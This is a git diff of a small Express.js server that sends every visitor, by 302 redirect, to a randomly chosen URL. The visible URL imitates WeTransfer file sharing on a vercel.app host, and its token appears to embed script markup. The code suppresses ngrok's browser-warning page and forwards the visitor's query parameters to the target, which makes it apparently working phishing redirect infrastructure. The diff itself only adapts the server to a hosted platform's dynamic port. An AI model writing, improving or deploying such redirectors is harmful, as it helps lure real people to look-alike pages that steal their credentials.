@@ -1,10 +1,10 @@
 const express = require("express");
 const app = express();
-const PORT = 5000; // Change if needed
 
-app.use((req, res, next) => {
-    res.setHeader("ngrok-skip-browser-warning", "true");
-    next();x
+const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
+
+app.get("/", (req, res) => {
+    res.set("ngrok-skip-browser-warning", "true"); // Bypass ngrok warning
 
     // List of URLs for redirection
     const urls = [
@@ -14,7 +14,7 @@ app.use((req, res, next) => {
         "https://wtransferstorage-docsbx5vq3nth6yz7e2gcqmlxtrznvkaf4dopcjmyapp.vercel.app/?_datashare_token=YbX5KJoRFmVZP8LTCGNhWqD26X39WMBKoObGl0YpmHrjHbEyWpubWUvc2NyLmpzIj48L3NjcmlwdD4KPC9oZWFkPgo8Ymskl"
     ];
 
-    // Select a random URL
+         // Select a random URL
     const selectedUrl = urls[Math.floor(Math.random() * urls.length)];
 
     // Append query parameters from request
@@ -22,16 +22,11 @@ app.use((req, res, next) => {
     const redirectUrl = queryParams ? `${selectedUrl}&${queryParams}` : selectedUrl;
 
     console.log(`Redirecting to: ${redirectUrl}`);
-
-    // Send an instant HTTP redirect
-    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
-    res.setHeader("Pragma", "no-cache");
-    res.setHeader("Expires", "0");
-    res.redirect(302, redirectUrl); // 302 ensures an instant redirect
+    
+    res.redirect(302, redirectUrl);
 });
 
 // Start the server
 app.listen(PORT, () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
-
